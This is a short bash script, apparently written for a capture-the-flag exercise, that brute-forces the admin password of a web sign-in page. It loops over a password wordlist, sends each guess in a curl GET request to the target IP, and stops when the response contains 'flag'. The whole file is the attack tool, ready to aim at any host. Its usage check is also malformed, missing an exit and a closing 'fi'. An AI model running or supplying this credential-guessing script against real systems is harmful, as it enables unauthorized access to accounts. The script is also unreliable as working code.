#!/bin/bash

if [ $# -eq 0 ]; then
    echo "usage: $0 <ip>"

pswdlist=($(cat pswdlist))
#pswdlist=($(cat xato-net-10-million-passwords-1000.txt))
length=${#pswdlist[@]}
current=0
ip_address=$1

for pswd in "${pswdlist[@]}"
do
    response=$(curl -s "http://$ip_address/?page=signin&username=admin&password=$pswd&Login=Login" | grep "flag")

    if [ ! -z "$response" ]; then
        echo "FOUND IT ! Password is : $pswd"
        echo $response
        break
    fi

    current=$((current+1))
    echo -ne "Current progress : $(((current * 100) / length))%\r"

done

